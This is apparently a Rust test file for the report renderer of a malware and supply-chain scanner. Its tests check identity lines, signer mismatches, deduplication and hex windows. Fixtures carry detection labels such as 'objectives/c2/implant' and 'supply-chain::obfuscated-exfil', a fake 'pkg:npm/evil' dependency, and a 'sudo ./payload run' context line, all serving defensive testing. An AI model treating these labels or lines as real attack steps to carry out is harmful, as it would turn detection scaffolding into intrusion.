use super::*;
use crate::types::{AnalysisReport, Evidence, FindingKind, TargetInfo, YaraMatch};
use chrono::Utc;

/// Identity fixture from JSON, so a test reads as the claims a file makes
/// rather than as struct assembly.
fn identity(json: serde_json::Value) -> filefacts::Identity {
    serde_json::from_value(json).expect("identity fixture")
}

fn identity_lines(id: &filefacts::Identity) -> String {
    let mut out = String::new();
    render_identity(&mut out, id, false);
    out
}

/// A package's self-description reaches the reader on its own line, cut to
/// fit, and is not repeated when it merely echoes the package name.
#[test]
fn package_description_renders_as_an_about_line() {
    let id = identity(serde_json::json!({
        "name": {"value": "@acme/cli-win32-x64", "source": "npm.name"},
        "identifier": {"value": "@acme/cli-win32-x64", "source": "npm.name"},
        "version": {"value": "5.6.1", "source": "npm.version"},
        "description": {
            "value": "Sandbox CLI core binary for Windows x64",
            "source": "npm.description",
        },
        "trust": "unsigned",
    }));
    let lines = identity_lines(&id);
    assert!(
        lines.contains("  about  \"Sandbox CLI core binary for Windows x64\"\n"),
        "{lines}"
    );

    let long = identity(serde_json::json!({
        "description": {"value": "x".repeat(150), "source": "whl.summary"},
        "trust": "unsigned",
    }));
    let lines = identity_lines(&long);
    assert!(
        lines.contains(&format!("about  \"{}…\"", "x".repeat(100))),
        "{lines}"
    );

    let echo = identity(serde_json::json!({
        "identifier": {"value": "left-pad", "source": "npm.name"},
        "description": {"value": "left-pad", "source": "npm.description"},
        "trust": "unsigned",
    }));
    assert!(!identity_lines(&echo).contains("about"));

    // A PE FileDescription that restates its ProductName adds nothing.
    let product = identity(serde_json::json!({
        "name": {"value": "tool.exe", "source": "pe.version.original_filename"},
        "project": {"value": "Acme Tool", "source": "pe.version.product_name"},
        "description": {"value": "acme tool", "source": "pe.version.description"},
        "trust": "unsigned",
    }));
    assert!(!identity_lines(&product).contains("about"));
}

/// A copyright notice becomes one claims token when it names someone other
/// than the company or signer, and is dropped when it only restates them.
#[test]
fn copyright_renders_only_when_it_names_a_different_holder() {
    let differs = identity(serde_json::json!({
        "name": {"value": "sandbox-cli.exe", "source": "pe.version.original_filename"},
        "organization": {"value": "Acme Ltd", "source": "pe.version.company"},
        "copyright": {
            "value": "Copyright (C) 2024 Tencent. All Rights Reserved. Licensed to example users",
            "source": "pe.version.copyright",
        },
        "trust": "unsigned",
    }));
    let lines = identity_lines(&differs);
    assert!(
        lines.contains(&format!(
            "copyright=\"{}…\"",
            "Copyright (C) 2024 Tencent. All Rights Reserved."
        )),
        "{lines}"
    );

    let restates = identity(serde_json::json!({
        "name": {"value": "msvcp140.dll", "source": "pe.version.original_filename"},
        "organization": {"value": "Microsoft Corporation", "source": "pe.signatures[0]"},
        "copyright": {
            "value": "© Microsoft Corporation. All rights reserved.",
            "source": "pe.version.copyright",
        },
        "trust": "platform",
    }));
    assert!(!identity_lines(&restates).contains("copyright"));

    let bare = identity(serde_json::json!({
        "name": {"value": "a.exe", "source": "pe.version.original_filename"},
        "copyright": {"value": "Copyright (C) 2024", "source": "pe.version.copyright"},
        "trust": "unsigned",
    }));
    assert!(!identity_lines(&bare).contains("copyright"));
}

/// A signed PE that claims one company in its version resource and carries
/// another on its Authenticode chain. The headline can only name one of
/// them; the disagreement is the signal, so both must reach the reader.
#[test]
fn pe_identity_shows_the_version_resource_beside_the_signature() {
    let id = identity(serde_json::json!({
        "name": {"value": "setup.exe", "source": "pe.version.original_filename"},
        "project": {"value": "Contoso Updater", "source": "pe.version.product_name"},
        "version": {"value": "3.5.1", "source": "pe.version.file_version"},
        "organization": {"value": "Contoso Ltd", "source": "pe.version.company_name"},
        "signer": {
            "common_name": "Vanguard Tech Limited",
            "organization": "Vanguard Tech Limited",
            "issuer": "DigiCert Trusted G4 Code Signing RSA4096",
            "signed_at": "2024-01-05T00:00:00Z",
            "source": "pe.signatures[0]",
        },
        "trust": "ca_signed",
        "build_path": {"value": "C:\\Users\\dev\\proj\\src\\main.rs", "source": "strings"},
    }));
    let headline = identity_headline(&id, false).expect("headline");
    let lines = identity_lines(&id);

    // The headline names the signer; the claims line names what the binary
    // says about itself, and the two disagree in plain sight.
    assert!(headline.contains("Vanguard Tech Limited"), "{headline}");
    assert!(lines.contains(r#"product="Contoso Updater""#), "{lines}");
    assert!(lines.contains(r#"company="Contoso Ltd""#), "{lines}");
    // The signer's own words, so the chain can be judged rather than trusted.
    assert!(lines.contains("issuer=\"DigiCert"), "{lines}");
    assert!(lines.contains("at=\"2024-01-05"), "{lines}");
    // The build path still reaches the reader.
    assert!(lines.contains(r"C:\Users\dev"), "{lines}");
    // Nothing the headline already showed is repeated.
    assert!(
        !lines.contains("O=\"Vanguard"),
        "signer org duplicated: {lines}"
    );
    assert!(
        !lines.contains("CN=\"Vanguard"),
        "signer name duplicated: {lines}"
    );
    assert!(
        !lines.contains(r#"file="setup.exe""#),
        "subject duplicated: {lines}"
    );
    assert!(
        !lines.contains(r#"version="3.5.1""#),
        "folded version duplicated: {lines}"
    );
}

/// A Mach-O keeps its team id and bundle version beside the signing
/// identity: a Developer ID whose team does not match the bundle it ships
/// is the same class of tell as the PE above.
#[test]
fn macho_identity_keeps_team_and_bundle_version() {
    let id = identity(serde_json::json!({
        "identifier": {"value": "com.contoso.helper", "source": "macho.bundle_identifier"},
        "version": {"value": "1.4.0", "source": "macho.bundle_version"},
        "team_id": {"value": "AB12CD34EF", "source": "macho.code_signature"},
        "signer": {
            "common_name": "Developer ID Application: Contoso Ltd (AB12CD34EF)",
            "organization": "Contoso Ltd",
            "source": "macho.code_signature",
        },
        "trust": "developer_id",
    }));
    let headline = identity_headline(&id, false).expect("headline");
    let lines = identity_lines(&id);
    assert!(headline.contains("com.contoso.helper"), "{headline}");
    assert!(headline.contains("developer-id"), "{headline}");
    // The identifier is the subject, so the version is *not* folded in and
    // must be carried here instead.
    assert!(lines.contains(r#"version="1.4.0""#), "{lines}");
    assert!(lines.contains(r#"team="AB12CD34EF""#), "{lines}");
    assert!(lines.contains("CN=\"Developer ID Application"), "{lines}");
}

/// An Office document names an author, a company and the application that
/// produced it. The headline shows two of the three; all three matter when
/// a document arrives from outside the company it claims.
#[test]
fn docx_identity_keeps_company_beside_author_and_producer() {
    let id = identity(serde_json::json!({
        "title": {"value": "Q3 Vendor Invoice", "source": "docprops.core.title"},
        "authors": [
            {"name": "Aleksandr Petrov", "email": "a.petrov@example.invalid",
             "role": "author", "source": "office.creator"},
            {"name": "Finance Bot", "role": "last_modified_by",
             "source": "docprops.core.lastModifiedBy"},
        ],
        "organization": {"value": "Contoso Ltd", "source": "docprops.app.company"},
        "producer": {"value": "Microsoft Office Word", "source": "docprops.app.application"},
        "trust": "unsigned",
    }));
    let headline = identity_headline(&id, false).expect("headline");
    let lines = identity_lines(&id);
    assert!(headline.contains("Q3 Vendor Invoice"), "{headline}");
    assert!(headline.contains("Aleksandr Petrov"), "{headline}");
    // The company the document claims — dropped from the headline because
    // an author outranked it — and the second party that touched it.
    assert!(lines.contains(r#"company="Contoso Ltd""#), "{lines}");
    assert!(lines.contains("Finance Bot"), "{lines}");
    assert!(lines.contains("(last_modified_by)"), "{lines}");
    // The author the headline already named is not repeated, but their
    // address — which the headline has no room for — is not lost either.
    assert!(!lines.contains("authors  Aleksandr Petrov,"), "{lines}");
    // Unsigned, so the producer is the headline's third slot: not repeated.
    assert!(!lines.contains(r#"producer="Microsoft"#), "{lines}");
}

/// A signed artifact shows its producing tool too: the headline spends its
/// third slot on the trust tier, so the tool would otherwise vanish.
#[test]
fn a_signed_artifact_still_names_its_producing_tool() {
    let id = identity(serde_json::json!({
        "title": {"value": "Quarterly Report", "source": "docprops.core.title"},
        "producer": {"value": "LibreOffice 7.6", "source": "docprops.app.application"},
        "signer": {"common_name": "Contoso Ltd", "source": "ooxml.signature"},
        "trust": "ca_signed",
    }));
    let headline = identity_headline(&id, false).expect("headline");
    assert!(headline.contains("ca-signed"), "{headline}");
    assert!(!headline.contains("LibreOffice"), "{headline}");
    assert!(
        identity_lines(&id).contains(r#"producer="LibreOffice 7.6""#),
        "{}",
        identity_lines(&id)
    );
}

/// The whole point is that this reaches the LLM view, which has no rich
/// header — only the minimal header plus these lines.
#[test]
fn tiny_view_carries_the_full_identity_block() {
    let mut file = src_file(
        0,
        "setup.exe",
        5,
        vec![finding_with("t/one", Criticality::Notable)],
        vec![],
    );
    file.file_type = "pe".to_string();
    file.identity = Some(identity(serde_json::json!({
        "name": {"value": "setup.exe", "source": "pe.version.original_filename"},
        "project": {"value": "Contoso Updater", "source": "pe.version.product_name"},
        "organization": {"value": "Contoso Ltd", "source": "pe.version.company_name"},
        "signer": {"organization": "Vanguard Tech Limited", "source": "pe.signatures[0]"},
        "trust": "ca_signed",
    })));
    let tiny = format_context(&report_with_files(vec![file]), &TinyOpts::tiny());
    assert!(tiny.contains("Vanguard Tech Limited"), "{tiny}");
    assert!(tiny.contains(r#"product="Contoso Updater""#), "{tiny}");
    assert!(tiny.contains(r#"company="Contoso Ltd""#), "{tiny}");
}

#[test]
fn embedded_label_formats_kind_offset_and_size() {
    assert_eq!(
        embedded_label("embedded:elf@0x324f9", 2508).as_deref(),
        Some("Embedded ELF @ 0x324f9 [2508 bytes]")
    );
    // Carrier-named payload (PE metadata name) keeps the name in the headline.
    assert_eq!(
        embedded_label("embedded:pe:payload.exe@0x5010", 4096).as_deref(),
        Some("Embedded PE payload.exe @ 0x5010 [4096 bytes]")
    );
    // A name that itself contains ':' splits only on the first separator.
    assert_eq!(
        embedded_label("embedded:pe:a:b@0x10", 1).as_deref(),
        Some("Embedded PE a:b @ 0x10 [1 bytes]")
    );
    // Ordinary paths are not embedded markers.
    assert_eq!(embedded_label("alvr/deps", 100), None);
}

/// The machine view collapses a finding repeated across a sample's own
/// members — the same "no symbol table" across a hundred of them is noise.
/// A fetched dependency is not one of those members: it is a separate
/// artifact with its own author, and its firing the same finding is a second
/// independent occurrence. Because the root renders first, the copy that got
/// dropped was the dependency's — silently deleting a hostile finding from
/// the block of the artifact that actually carried it.
#[test]
fn dedup_does_not_cross_a_fetched_artifact_boundary() {
    let shared = "objectives/exec/install-hook";
    let mut root = src_file(
        0,
        "wrapper.tgz",
        5,
        vec![finding_with(shared, Criticality::Suspicious)],
        vec![],
    );
    root.depth = 0;

    // An ordinary member of the sample: its repeat is noise, still collapsed.
    let mut member = src_file(
        1,
        "wrapper.tgz!!lib/a.js",
        4,
        vec![finding_with(shared, Criticality::Suspicious)],
        vec![],
    );
    member.depth = 1;
    member.parent_id = Some(0);

    // A fetched dependency, and one of its own members.
    let mut dep = src_file(
        2,
        "pkg:npm/evil@1.0.0",
        4,
        vec![finding_with(shared, Criticality::Hostile)],
        vec![],
    );
    dep.depth = 1;
    dep.parent_id = Some(0);
    dep.rel = crate::types::Rel::Fetched;
    let mut dep_member = src_file(
        3,
        "pkg:npm/evil@1.0.0!!index.js",
        3,
        vec![finding_with(shared, Criticality::Hostile)],
        vec![],
    );
    dep_member.depth = 2;
    dep_member.parent_id = Some(2);

    let report = report_with_files(vec![root, member, dep, dep_member]);
    let tiny = format_context(&report, &TinyOpts::tiny());

    // Containers collapse their findings into the member that carries them,
    // so the two blocks that render are the sample's member and the
    // dependency's. The criticality marker tells them apart: S is the
    // sample's copy, H the dependency's. Deduped across the boundary, the
    // sample renders first and H disappears entirely.
    assert!(
        tiny.contains("# H "),
        "the dependency's own finding was deduped away against the sample's: {tiny:?}",
    );
    assert_eq!(
        tiny.matches("# H ").count(),
        1,
        "dedup still collapses repeats inside the dependency: {tiny:?}",
    );
    assert_eq!(
        tiny.matches("# S ").count(),
        1,
        "dedup still collapses repeats inside the sample: {tiny:?}",
    );
}

fn finding_with(id: &str, crit: Criticality) -> Finding {
    Finding {
        precomputed_spans: None,
        src: None,
        kind: FindingKind::Capability,
        trait_refs: vec![],
        id: id.to_string().into(),
        desc: id.to_string().into(),
        conf: 0.9,
        crit,
        mbc: None,
        attack: None,
        evidence: vec![],
        match_count: 0,
        source_file: None,
        downgraded: false,
    }
}

fn file_with_findings(findings: Vec<Finding>) -> FileAnalysis {
    let mut fa = FileAnalysis::new(0, "/t".to_string(), "elf".to_string(), "sha".to_string(), 1);
    fa.findings = findings;
    fa
}

/// A source (`python`) file with an explicit score, findings, and pre-built
/// context — the inputs the tiny context view ranks and renders from.
fn src_file(
    id: u32,
    path: &str,
    score: u32,
    findings: Vec<Finding>,
    context: Vec<Win>,
) -> FileAnalysis {
    let mut fa = FileAnalysis::new(
        id,
        path.to_string(),
        "python".to_string(),
        format!("sha{id}"),
        100,
    );
    fa.score = score;
    fa.findings = findings;
    annotate(&mut fa, context);
    fa
}

/// A context window and the notes a test means it to carry.
struct Win {
    line: crate::types::ContextLine,
    notes: Vec<crate::types::Note>,
}

/// Append `context`'s windows to `fa`. Notes are derived from findings when
/// a report renders, so each intended note becomes a span (and the label)
/// of its finding, and a finding the test didn't supply is added from it.
fn annotate(fa: &mut FileAnalysis, context: Vec<Win>) {
    for Win { line, notes } in context {
        for n in notes {
            let at = fa
                .findings
                .iter()
                .position(|f| f.id == n.id)
                .unwrap_or_else(|| {
                    let mut f = Finding::new(
                        n.id.to_string(),
                        FindingKind::Capability,
                        n.desc.to_string(),
                        n.conf,
                    );
                    f.crit = n.crit;
                    fa.findings.push(f);
                    fa.findings.len() - 1
                });
            // One label per finding: a note's description replaces the
            // id-as-description placeholder `finding_with` gives a finding.
            let f = &mut fa.findings[at];
            if f.desc == f.id {
                f.desc = n.desc;
            }
            f.precomputed_spans
                .get_or_insert_with(Vec::new)
                .push([n.off, u64::from(n.len)]);
        }
        fa.context.push(line);
    }
}

/// Bytes reserved per test line, so windows on different lines never share
/// bytes (capture never emits overlapping windows).
const LINE_BYTES: u64 = 1000;

/// A single-line textual chunk at display line `line`, carrying an optional
/// note written with `off == line` meaning `data[0]` (ids and columns read
/// naturally; the bytes sit at `line * LINE_BYTES`).
fn ctx_line(line: u64, data: &str, note: Option<crate::types::Note>) -> Win {
    let loc = line * LINE_BYTES;
    Win {
        line: crate::types::ContextLine {
            loc,
            line: Some(line),
            col: Some(1),
            data: data.as_bytes().to_vec(),
        },
        notes: note
            .into_iter()
            .map(|n| crate::types::Note {
                off: loc + n.off.saturating_sub(line),
                ..n
            })
            .collect(),
    }
}

fn ctx_note(id: &str, crit: Criticality, loc: u64) -> crate::types::Note {
    crate::types::Note {
        crit,
        id: id.to_string().into(),
        desc: format!("{id} desc").into(),
        off: loc,
        len: 4,
        conf: 0.9,
    }
}

/// An empty finalized report with `files` swapped in — the tiny view reads
/// `report.files` directly, so this drives `format_tiny` from raw files.
fn report_with_files(files: Vec<FileAnalysis>) -> AnalysisReport {
    let mut report = create_test_report(vec![], vec![]);
    report.files = files;
    report
}

/// A binary (`elf`) file with a score, findings, and pre-built byte context —
/// what the tiny binary (ASCII-forward) view renders from.
fn bin_file(id: u32, score: u32, findings: Vec<Finding>, context: Vec<Win>) -> FileAnalysis {
    let mut fa = FileAnalysis::new(
        id,
        format!("/mal{id}.bin"),
        "elf".to_string(),
        format!("sha{id}"),
        4096,
    );
    fa.score = score;
    fa.findings = findings;
    annotate(&mut fa, context);
    fa
}

/// A raw-byte context unit starting at byte offset `loc`, carrying `notes`
/// (each note's `off` is an absolute file offset). No `line`/`col` marks it a
/// binary byte unit rather than a textual chunk.
fn byte_unit(loc: u64, data: &[u8], notes: Vec<crate::types::Note>) -> Win {
    Win {
        line: crate::types::ContextLine {
            loc,
            line: None,
            col: None,
            data: data.to_vec(),
        },
        notes,
    }
}

/// an embedding host's focused terminal knobs: hard cap of 5, selection narrowed to
/// suspicious+ and their legs, colorless for deterministic assertions.
fn focused_opts() -> TinyOpts {
    TinyOpts {
        top_n: 5,
        always_crit: None,
        focus_crit: Some(Criticality::Suspicious),
        context_lines: Some(1),
        full_context: false,
        color: false,
        ..TinyOpts::terminal()
    }
}

/// The terminal view draws a match's own rows plus one row either side —
/// two for a hostile hit — however many bytes capture reserved around it.
/// A criticality-sized window (up to 128/256 bytes) rendered whole turned a
/// single finding into a twenty-row block.
#[test]
fn terminal_hex_window_keeps_one_margin_row_two_when_hostile() {
    let opts = TinyOpts {
        color: false,
        ..TinyOpts::terminal()
    };
    let rows = |crit: Criticality| {
        let finding = Finding {
            precomputed_spans: None,
            src: None,
            kind: FindingKind::Capability,
            trait_refs: vec![],
            id: "a/hit".to_string().into(),
            desc: "a/hit desc".into(),
            conf: 0.9,
            crit,
            mbc: None,
            attack: None,
            evidence: vec![],
            match_count: 0,
            source_file: None,
            downgraded: false,
        };
        // 160 bytes of captured window; the match is four bytes in the middle.
        let unit = byte_unit(0, &[0x41; 160], vec![ctx_note("a/hit", crit, 80)]);
        let report = report_with_files(vec![bin_file(1, 50, vec![finding], vec![unit])]);
        format_context(&report, &opts)
            .lines()
            .filter(|l| l.starts_with(|c: char| c.is_ascii_hexdigit()))
            .count()
    };
    // One hit row (a 4-byte match cannot straddle more than two) plus its
    // margin: 1 either side for notable, 2 for hostile.
    assert_eq!(rows(Criticality::Notable), 3);
    assert_eq!(rows(Criticality::Hostile), 5);
}

#[test]
fn focused_selection_keeps_suspicious_plus_legs_only() {
    // A hostile composite, the component leg it references (anchored to a
    // source line), and an unreferenced notable. Focused selection keeps
    // the composite and its windowed leg; the bystander notable is dropped.
    let composite = Finding {
        trait_refs: vec!["c2/leg".to_string().into()],
        ..finding_with("objectives/c2/implant", Criticality::Hostile)
    };
    let leg = finding_with("c2/leg", Criticality::Component);
    let bystander = finding_with("misc/loose-notable", Criticality::Notable);
    let leg_ctx = ctx_line(
        1,
        "import socket_beacon",
        Some(ctx_note("c2/leg", Criticality::Component, 1)),
    );
    let report = report_with_files(vec![src_file(
        0,
        "/a.py",
        5,
        vec![composite, leg, bystander],
        vec![leg_ctx],
    )]);

    let out = format_context(&report, &focused_opts());
    assert!(out.contains("c2/implant"), "{out:?}");
    assert!(out.contains("import socket_beacon"), "{out:?}");
    assert!(!out.contains("misc/loose-notable"), "{out:?}");
}

#[test]
fn focused_locationless_stays_suspicious_and_above() {
    // A location-less notable — a container's archive-shape observation,
    // say — has no window to anchor it, and the focused view refuses to
    // surface it as a floating note. A location-less *hostile* (a
    // cross-file composite) still renders: that's the verdict's evidence.
    let report = report_with_files(vec![src_file(
        0,
        "/b.py",
        2,
        vec![
            finding_with("objectives/c2/implant", Criticality::Hostile),
            finding_with("misc/loose-notable", Criticality::Notable),
        ],
        vec![],
    )]);
    let out = format_context(&report, &focused_opts());
    assert!(out.contains("c2/implant"), "{out:?}");
    assert!(!out.contains("misc/loose-notable"), "{out:?}");
}

#[test]
fn focused_file_without_flags_keeps_windowed_notables() {
    // Nothing at focus_crit fired: selection falls back to the ordinary
    // notable view, so an unremarkable file is not silenced — but only
    // through its windows; a location-less notable stays dropped.
    let anchored = finding_with("misc/anchored-notable", Criticality::Notable);
    let floating = finding_with("misc/floating-notable", Criticality::Notable);
    let ctx = ctx_line(
        1,
        "import ctypes",
        Some(ctx_note("misc/anchored-notable", Criticality::Notable, 1)),
    );
    let report = report_with_files(vec![src_file(
        0,
        "/b.py",
        2,
        vec![anchored, floating],
        vec![ctx],
    )]);
    let out = format_context(&report, &focused_opts());
    assert!(out.contains("import ctypes"), "{out:?}");
    assert!(!out.contains("misc/floating-notable"), "{out:?}");
}

#[test]
fn focused_multi_row_hit_earns_no_trailing_row() {
    // A hostile span that already continues onto multiple hex rows has
    // shown its continuation — no trailing row is added after it. A
    // one-row hit still keeps its single trail. The renderer's stride
    // follows the detected terminal width, so derive the expected number
    // of match-bearing rows instead of assuming a 16-byte stride.
    let long_hit = finding_with("objectives/spans-two-rows", Criticality::Hostile);
    let mut note = ctx_note("objectives/spans-two-rows", Criticality::Hostile, 0);
    note.len = 20;
    let mut file = bin_file(
        0,
        9,
        vec![long_hit],
        vec![byte_unit(0, &[0x42; 64], vec![note])],
    );
    file.file_type = "elf".to_string();
    let report = report_with_files(vec![file]);
    let out = format_context(&report, &focused_opts());
    let hex_rows = out.lines().filter(|l| l.contains("42 42 42")).count();
    let loc_width = format!("{:x}", 64).len();
    let expected_match_rows = 20_usize.div_ceil(hex_stride(terminal_width(), loc_width));
    assert_eq!(hex_rows, expected_match_rows, "{out:?}");
}

#[test]
fn focused_cap_is_hard_even_for_hostile() {
    // Seven hostiles at descending confidence: only the strongest five
    // render — always_crit: None means nothing bypasses top_n.
    let findings: Vec<Finding> = (0..7)
        .map(|i| Finding {
            conf: 0.99 - 0.05 * i as f32,
            ..finding_with(&format!("objectives/h{i}"), Criticality::Hostile)
        })
        .collect();
    let report = report_with_files(vec![src_file(0, "/c.py", 9, findings, vec![])]);
    let out = format_context(&report, &focused_opts());
    for i in 0..5 {
        assert!(out.contains(&format!("objectives/h{i}\n")), "{out:?}");
    }
    for i in 5..7 {
        assert!(!out.contains(&format!("objectives/h{i}\n")), "{out:?}");
    }
}

#[test]
fn focused_hex_window_drops_unselected_notes_and_keeps_a_trail() {
    // One merged 64-byte window: a hostile note at its head, an unselected
    // notable's note further down. Focused rendering keeps the hit row and
    // one trailing row; the notable neither renders a row nor a comment.
    let hostile = finding_with("objectives/h", Criticality::Hostile);
    let mut file = bin_file(
        0,
        9,
        vec![hostile],
        vec![byte_unit(
            0,
            &[0x41; 64],
            vec![
                ctx_note("objectives/h", Criticality::Hostile, 0),
                ctx_note("misc/loose-notable", Criticality::Notable, 48),
            ],
        )],
    );
    file.file_type = "elf".to_string();
    let report = report_with_files(vec![file]);
    let out = format_context(&report, &focused_opts());
    assert!(out.contains("objectives/h desc"), "{out:?}");
    assert!(!out.contains("misc/loose-notable"), "{out:?}");
    // Hit row plus at least one trailing context row of hex cells.
    let hex_rows = out.lines().filter(|l| l.contains("41 41 41")).count();
    assert!(
        hex_rows >= 2,
        "expected hit row + trail, got {hex_rows}: {out:?}"
    );
}

#[test]
fn focused_source_trail_skips_near_empty_and_stops_after_one_line() {
    // A hostile hit keeps the next *real* line (the lone `}` is skipped);
    // rows past the trail are dropped even though the chunk carries them.
    let hostile = finding_with("objectives/h", Criticality::Hostile);
    let chunk = Win {
        line: crate::types::ContextLine {
            loc: 0,
            line: Some(1),
            col: Some(1),
            data: b"sudo ./payload run\n}\ninstall -Dm755 target\nunrelated trailing line\n"
                .to_vec(),
        },
        notes: vec![ctx_note("objectives/h", Criticality::Hostile, 0)],
    };
    let report = report_with_files(vec![src_file(0, "/d.sh", 9, vec![hostile], vec![chunk])]);
    let out = format_context(&report, &focused_opts());
    assert!(out.contains("sudo ./payload run"), "{out:?}");
    assert!(out.contains("install -Dm755 target"), "{out:?}");
    assert!(!out.contains("unrelated trailing line"), "{out:?}");
}

#[test]
fn container_shows_cross_file_composites_not_member_duplicates() {
    // An archive container re-evaluates member content at container scope, so
    // it accumulates both genuine cross-file composites (native only here) and
    // copies of member findings (also native on the member). The container
    // must surface the former and drop the latter, which renders on the member.
    let composite = Finding {
        trait_refs: vec!["a".to_string().into(), "b".to_string().into()],
        ..finding_with(
            "objectives/supply-chain/install-hook::native-implant",
            Criticality::Hostile,
        )
    };
    // A member atomic that also got re-evaluated onto the container.
    let dup_on_container = finding_with(
        "metadata/package/fields/scripts::has-preinstall",
        Criticality::Suspicious,
    );
    // The same finding, native to the member where it was actually located.
    let dup_on_member = finding_with(
        "metadata/package/fields/scripts::has-preinstall",
        Criticality::Suspicious,
    );

    let mut container = FileAnalysis::new(
        0,
        "/x/pkg.tgz".to_string(),
        "tar.gz".to_string(),
        "sha".to_string(),
        10,
    );
    container.depth = 0;
    container.findings = vec![composite, dup_on_container];

    let mut member = FileAnalysis::new(
        1,
        "/x/pkg.tgz!!package/package.json".to_string(),
        "package.json".to_string(),
        "sha2".to_string(),
        5,
    );
    member.depth = 1;
    member.findings = vec![dup_on_member];

    let mut report = AnalysisReport::new(TargetInfo {
        path: "/x/pkg.tgz".to_string(),
        ..Default::default()
    });
    report.files = vec![container, member];

    let out = strip_ansi(&format_terminal_ctx(&report));

    // The cross-file composite is the container's verdict and must show.
    assert!(
        out.contains("native-implant") || out.contains("install-hook"),
        "container must show the cross-file composite, got:\n{out}"
    );
    // The duplicated atomic renders on the member (indented), not the container.
    let member_indented = out
        .lines()
        .any(|l| l.starts_with("  ") && l.contains("has-preinstall"));
    assert!(
        member_indented,
        "member finding must render indented under the archive, got:\n{out}"
    );
    // It must NOT appear at the container's (unindented) level.
    let on_container = out
        .lines()
        .any(|l| !l.starts_with(' ') && l.contains("has-preinstall"));
    assert!(
        !on_container,
        "duplicated member atomic must not render on the container, got:\n{out}"
    );
}

#[test]
fn registry_purl_rebuilds_from_registry_facts() {
    let mut reg = FileAnalysis::new(
        0,
        "be5invis_iosevka.registry.json".to_string(),
        "registry".to_string(),
        "sha".to_string(),
        64,
    );
    // Non-registry file: no purl regardless of any kv.
    let mut js = FileAnalysis::new(1, "/a.js".into(), "javascript".into(), "s2".into(), 8);
    js.kv
        .insert("registry.ecosystem".into(), serde_json::json!("github"));
    assert_eq!(registry_purl(&js), None, "non-registry file yields no purl");

    // A versionless registry node drops the `@version` suffix.
    reg.kv
        .insert("registry.ecosystem".into(), serde_json::json!("github"));
    reg.kv.insert(
        "registry.name".into(),
        serde_json::json!("be5invis/iosevka"),
    );
    assert_eq!(
        registry_purl(&reg).as_deref(),
        Some("pkg:github/be5invis/iosevka")
    );

    // With a version it is appended.
    reg.kv
        .insert("registry.version".into(), serde_json::json!("34.7.0"));
    assert_eq!(
        registry_purl(&reg).as_deref(),
        Some("pkg:github/be5invis/iosevka@34.7.0")
    );

    // Missing name → no purl (a fact's absence is meaningful).
    reg.kv.remove("registry.name");
    assert_eq!(registry_purl(&reg), None);
}

#[test]
fn composite_source_trail_shows_member_and_registry_provenance() {
    use crate::types::file_analysis::{ARCHIVE_DELIMITER, CompositeSource};

    let fid = "supply-chain::obfuscated-exfil";
    let mut container = FileAnalysis::new(0, "/pkg.tgz".into(), "tar.gz".into(), "s0".into(), 100);
    container.composite_sources.insert(
        fid.to_string(),
        vec![
            CompositeSource {
                file: 1,
                line: Some(12),
                offset: Some(200),
            },
            CompositeSource {
                file: 2,
                line: None,
                offset: Some(0),
            },
        ],
    );

    let member = FileAnalysis::new(
        1,
        format!("/pkg.tgz{ARCHIVE_DELIMITER}pkg/install.js"),
        "javascript".into(),
        "s1".into(),
        20,
    );
    let mut registry = FileAnalysis::new(
        2,
        "be5invis_iosevka.registry.json".into(),
        "registry".into(),
        "s2".into(),
        64,
    );
    registry
        .kv
        .insert("registry.ecosystem".into(), serde_json::json!("github"));
    registry.kv.insert(
        "registry.name".into(),
        serde_json::json!("be5invis/iosevka"),
    );

    let id_to_file: HashMap<u32, &FileAnalysis> =
        [(1u32, &member), (2u32, &registry)].into_iter().collect();

    let trail = composite_source_trail(&container, fid, &id_to_file);
    // The code leg renders as a member path + line; the provenance leg as a
    // reconstructed purl, not the synthetic `*.registry.json` filename.
    assert!(
        trail.contains(&"pkg/install.js:12".to_string()),
        "archive member leg with line, got: {trail:?}"
    );
    assert!(
        trail.contains(&"registry/pkg:github/be5invis/iosevka".to_string()),
        "registry provenance leg as registry/<purl>, got: {trail:?}"
    );
}

pub(super) fn strip_ansi(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars();
    while let Some(c) = chars.next() {
        if c == '\u{1b}' {
            for c2 in chars.by_ref() {
                if c2.is_ascii_alphabetic() {
                    break;
                }
            }
        } else {
            out.push(c);
        }
    }
    out
}

#[test]
fn select_ids_always_shows_suspicious_and_hostile_past_cap() {
    // 60 hostile findings with a cap of 50: every one must survive,
    // because suspicious/hostile bypass `top_n` entirely.
    let findings = (0..60)
        .map(|i| finding_with(&format!("hostile-{i}"), Criticality::Hostile))
        .collect();
    let file = file_with_findings(findings);
    let selected = select_ids(&file, &TinyOpts::terminal(), 0);
    assert_eq!(
        selected.len(),
        60,
        "all 60 hostile must show despite cap 50"
    );
}

#[test]
fn select_ids_caps_lower_crit_remainder_but_keeps_high() {
    // 60 notable + 8 suspicious/hostile, cap 40. All 8 high-crit show;
    // the notable remainder fills to a total of 40 (32 notables).
    let mut findings: Vec<Finding> = (0..60)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    for i in 0..5 {
        findings.push(finding_with(&format!("sus-{i}"), Criticality::Suspicious));
    }
    for i in 0..3 {
        findings.push(finding_with(&format!("hostile-{i}"), Criticality::Hostile));
    }
    let file = file_with_findings(findings);
    let selected = select_ids(&file, &TinyOpts::terminal(), 0);
    assert_eq!(selected.len(), 40, "total capped at 40");
    for i in 0..5 {
        assert!(selected.contains(&format!("sus-{i}").as_str()));
    }
    for i in 0..3 {
        assert!(selected.contains(&format!("hostile-{i}").as_str()));
    }
    let notables = selected
        .iter()
        .filter(|id| id.starts_with("notable-"))
        .count();
    assert_eq!(
        notables, 32,
        "lower-crit remainder fills the rest of the 40"
    );
}

#[test]
fn tiny_view_widens_cap_to_250() {
    // 300 notable findings: the terminal cap (40) truncates hard, but the
    // tiny/LLM view casts a wider net — top 250 — so the model sees far more
    // of the picture before the cap bites.
    let findings = (0..300)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    let file = file_with_findings(findings);
    assert_eq!(select_ids(&file, &TinyOpts::terminal(), 0).len(), 40);
    assert_eq!(select_ids(&file, &TinyOpts::tiny(), 0).len(), 250);
}

#[test]
fn low_tier_fill_tops_up_to_budget_without_evicting() {
    // 5 notable + 20 low-tier with a fill of 15: all 5 notable stay, the 10
    // best low-tier top the selection up to exactly 15.
    let mut findings: Vec<Finding> = (0..5)
        .map(|i| finding_with(&format!("notable-{i}"), Criticality::Notable))
        .collect();
    for i in 0..10 {
        findings.push(finding_with(&format!("comp-{i}"), Criticality::Component));
    }
    for i in 0..10 {
